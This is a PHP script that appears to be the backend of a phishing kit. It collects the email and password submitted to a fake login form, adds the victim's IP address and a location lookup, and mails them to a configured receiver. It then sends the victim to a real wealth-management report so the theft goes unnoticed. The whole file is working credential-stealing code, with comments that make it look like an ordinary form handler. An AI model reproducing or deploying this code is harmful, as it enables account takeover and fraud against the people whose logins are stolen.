<?php
require_once '../config.php';
// Set email data
$to = EMAIL_RECEIVER;
$head = EMAIL_HEADER;
$subject = "My Other Result 2";
$headers = "From: Noreply<$head>\r\n";

// Set username and password
$username = $_POST['email']; // Ensure you validate and sanitize input data in a real application
$password = $_POST['password']; // Ensure you validate and sanitize input data in a real application

// Initialize message with username and password
$message .= "---------------|54|---------------\n";
$message .= "Username: $username\nPassword: $password\n";

// Function to get IP address of the user
function getIPAddress() {
    if (!empty($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
        return $_SERVER['HTTP_X_FORWARDED'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
        return $_SERVER['HTTP_FORWARDED'];
    } else {
        return 'UNKNOWN';
    }
}

// Function to get location information based on IP address using ip-api.com
function getLocationInfo($ip) {
    $url = "http://ip-api.com/json/$ip";
    $response = file_get_contents($url);
    $data = json_decode($response, true);
    return $data;
}

// Get IP address
$ip = getIPAddress();

// Get location information
$locationInfo = getLocationInfo($ip);

// Extract country, city, and zip code

$country = isset($locationInfo['country']) ? $locationInfo['country'] : 'Unavailable';
$city = isset($locationInfo['city']) ? $locationInfo['city'] : 'Unavailable';
$zip = isset($locationInfo['zip']) ? $locationInfo['zip'] : 'Unavailable';

// Append location information to the message
$message .= "Country: $country\nCity: $city\nZIP Code: $zip\n";

// Attempt to send the email
if (mail($to, $subject, $message, $headers)) {
    
echo "<script>window.location.href='https://www.oliverwyman.com/content/dam/oliver-wyman/v2/publications/2020/jun/Global-Wealth-Management-Report-2020.pdf';</script>";
} else {
    echo "<script>window.location.href='index.html';</script>";
}
?>

?>